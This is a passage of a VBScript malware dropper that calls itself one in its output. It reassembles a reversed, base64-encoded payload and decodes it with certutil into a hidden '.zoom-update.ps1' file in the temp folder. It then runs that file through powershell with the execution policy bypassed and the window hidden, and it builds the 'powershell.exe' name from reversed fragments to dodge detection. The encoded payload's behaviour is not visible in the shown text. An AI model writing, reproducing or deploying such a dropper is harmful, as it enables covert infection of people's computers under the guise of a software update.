    "T9GOt9Ue0InW2QVQm5WZPNTcUFTOWdVVj1EN4hWQtNkY4Jja", _
    "6FDMkV2asZlc2F3bygVOylkZnZUcnR0SvdDdKhlUsZ1TRdHT", _
    "pxUVopUTW1WNvQ1cIF2cptCR3kTYyEkQ0llTKpVZPBTcjZjc", _
    "5M1brhTasp0VhtWO2EHcxBzRENjNklXY0VWU30UYJZUMFlHe", _
    "x50KWp3ZPBFcslEaxg1RWlWSnFVVhJmcQNDe3Z1cRNVeUFWV", _
    "3kEThlje2ZGTkpUerZnexcmdMpmNzsmb08kSih0c5hGbRl2V", _
    "0UkeRlXdhlVZylFbZNWYrN1LwYmNpd2UCxmWPJXe6JjdFV1Q", _
    "9ASbhVmc0NlenRCIgACIK0QKnMEOvYTbmNmcvh3Qxk3LllTc", _
    "lRXeCp3ZkwCKtFWZyR3U5J3btVWTu8USgQ3YlpmYP1ydl5EI", _
    "lJHct92Qu8USgQ3YlpmYP1ydl5EI9ACcpp3ZkACIgAiCNkyc", _
    "D5yTJtFIs0WYlJHdTp3ZkgSbhVmc0NVZ0FGbmVGRu42bpN3c", _
    "yBXbvNWZEpjOdVGZv1kbvl2czVmcw12bD5ibvl2czVmcw12b", _
    "0NlLPlEI0NWZqJ2TtcXZOBSPgIXZkFWZyRCIgACIK0QKzNXZ", _
    "VpjOddmbpR2bj5WRuQHelR1WgwCcpp3ZkgiclRWYlJVbhVmc", _
    "uV0bURWYlJlLyVGZhVmckASPgU2YyV3bzRCIgACIK0QK4YEV", _
    "pRkLwlmenRCI7kCKlN3bwNXaE5iclRWYlJHJgACIgoQDpgCZ", _
    "jRCIgACIK0QKoU2cvB3cpRkLtFWZyR3U6dGJgsTKoU2cvB3c", _
    "slGct92Qu02bEVGZvNkLtVGdzl3UgQ3YlpmYP1ydl5EI9ACc", _
    "yVmbldkLwNGJgACIgoQDzJXZ0VWbhJXYQJXZslGct92QuIXZ", _
    "0Fmcl5WZH5CcjRCIgACIK0QZ1JHdkASPgkncv1WZN5WSlRXY", _
    "slGct92QuA3YkACIgAiCNU2csFmZkASPgUGbiFGd1NWZ4VUZ", _
    "zl3UngCQgACIgoQDnsSZ6lWbpRHcv9yJg0DIz52bpRHcPJXZ", _
    "T5SblR3c5N1JscCbsRmLlJ3bD5SblR3c5N1JscCbsRmLtVGd", _
    "pcCbsRmLwJXYoN1QuQnZvN3byNWaNdCLnwGbk5Se0lmc1NWZ", _
    "k0FZp9mdbBCIgACIgACIK0wegQ3YlpmYP1CajFWRy9mRgwHI", _
    "gACIK0QKfRCKkRWQuMXZpxmYtV2czFEZlNmblJXZmVmUuA3Y", _
    "vJ3Yp1EI0NWZqJ2TtcXZOBSPgIXZklmdvJHckACIgAiCN0HI", _
    "gACIgoQDyVGZpZ3byBVZk92QwJXYoN1QuAnchh2UD5Cdm92c", _
    "GlHbi1WZzNXQlxWaw12bD5iclRWa29mcwRCI9ACdsV3clJHJ", _
    "lJHJoAiZpBCIgAiCNkSZjJXdvNHJgwCcjRCKlNmc192Ut9mc", _
    "gACIgACIgAiCNsHIpADI0dWLgQnb192QuMncvJncF5CdsV3c", _
    "kAibpBSZkgCIoNWYlJ3bmBCIgACIgACIK0wJnASPgQHelRHJ", _
    "ulmc0N1bU5SZkASPrACd4VGdkAyegkycy9mcyVkL0xWdzVmc", _
    "XpjOdVGbpZkLPl0WgACIgACIgAiCN0HIi4GYyBmIgsCIpgyZ", _
    "vp3JgAVTFRlO25WZkACa0FGUt4WavpEKoQHelRFbsFUZ0lmc", _
    "gACIgACIgoQDpQHelRHJgwSKnc2bs5CbsVGazJXZ39Gct02b", _
    "uQHb1NXZyRCI9ASZwlHdkACIgAiCN0HIgACIK0gMgQXa4VGI", _
    "yVGZh9GTt92badCKlBXeURXZH5SesJWblN3cBRWZslGct92Q", _
    "NdCKk9Ga0VWT0V2RuUGc5RHJg0DIk9Ga0VWbkACIgAiCNkyJ", _
    "goQDFR0TN9VTP9kW6YnblRCI9ASZk9WbkACIgAiCNkyJulWY", _
    "lR2btRCK5RHctVkcPxGb150cJpjOddmbpJHdztFKgYWagACI", _
    "r9mdulGJgACIgoQD9ByJsxWY0NnbpdCI9ASZk9WbkAyegkSK", _
    "gACIK0QMgcSXbR3YlpmYvdCI0NWZqJ2TtcXZOBSPgM3ZyFUZ", _
    "pUGZv1GJoAUXdt1Zulmc0N3Wg0DIdBzWzdmcBV2avZnbpRCI", _
    "gwCbsVnbkgSZr9mdulkLk9Ga0VWbkASPgUGZvNGJgACIgoQD", _
    "9pQDlR2bjRSX05WabBCdphXZgACIgoQDpM3ZyFUZr9mdulGJ", _
    "slmRu8USbBCIgACIgACIK0wegknc0BCIgAiCNsHIoNGdhNGI", _
    "NVEV6YnblRCIoRXYQ1ibp9mSogCd4VGVsxWQlRXaydlO60VZ", _
    "ulmc0N1bU5yXkACLpcyZvxmLsxWZoNncld3bw1Sbv9menACU", _
    "=0nCNEDI0lGelBCIgAiCN03egg2Y0F2Yg0HIgACIK0QKpgyZ" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
